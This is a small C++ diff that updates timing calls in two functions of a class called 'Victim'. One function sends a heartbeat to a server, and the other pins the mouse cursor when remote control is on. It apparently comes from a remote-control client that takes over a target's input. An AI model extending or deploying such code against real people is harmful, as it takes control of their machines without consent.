@@ -163,14 +163,14 @@ void Victim::keepAwake()
 {
     while (true) {
         //every 2 seconds send a signal to the server so not to be flagged asleep
-        if (isConnected && Mlib::getTime() - lastAwakeSignal > 2'000) {
+        if (isConnected && Mlib::currentTime().asMil() - lastAwakeSignal > 2'000) {
             sf::Packet p;
             p << sf::Uint8('r');
             server.send(p);
-            lastAwakeSignal = Mlib::getTime();
+            lastAwakeSignal = Mlib::currentTime().asMil();
         }
         //sleep to save computing power
-        Mlib::sleep(50);
+        Mlib::sleep(Mlib::milliseconds(50));
     }
 }
 
@@ -210,6 +210,6 @@ void Victim::pinMouse()
     while (true) {
         if (controlMouse)
             Mlib::Mouse::setPos(mousePos);
-        Mlib::sleep(1);
+        Mlib::sleep(Mlib::milliseconds(1));
     }
 }
